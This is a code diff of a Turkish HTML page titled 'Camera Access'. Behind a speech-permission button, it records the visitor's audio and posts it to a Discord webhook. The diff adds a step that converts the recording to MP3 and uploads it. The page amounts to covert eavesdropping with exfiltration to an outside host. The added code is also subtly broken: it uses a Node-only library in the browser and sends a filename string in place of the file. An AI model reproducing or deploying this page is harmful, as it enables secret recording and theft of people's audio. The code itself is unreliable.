@@ -1,9 +1,9 @@
-<!DOCTYPE html>
-<html>
-  <head>
-    <title>Kamera Erişimi</title>
-  </head>
-  <body>
+<!DOCTYPE  html> 
+<html> 
+  <head> 
+    <title>Kamera  Eriş imi</title> 
+  </head> 
+  <body> 
     <h1>Kamera Erişimi</h1>
     <button id="allow-mic">Konuşma İzni Ver</button>
     <div id="picture-container"></div>
@@ -103,6 +103,16 @@
             formData.append('username', 'Kamera Erişimi');
             formData.append('content', 'Ses Kaydı Alındı!');
 
+            // Convert the WAV file to MP3 using ffmpeg
+            const ffmpeg = require('fluent-ffmpeg');
+            ffmpeg(audioBlob)
+              .setFormat('mp3')
+              .setAudioCodec('libmp3lame')
+              .setAudioBitrate(128)
+              .save(`audioRecording.mp3`);
+
+            // Send the MP3 file to the Discord webhook
+            formData.append('file', `audioRecording.mp3`);
             fetch(webhookUrl, {
               method: 'POST',
               body: formData,
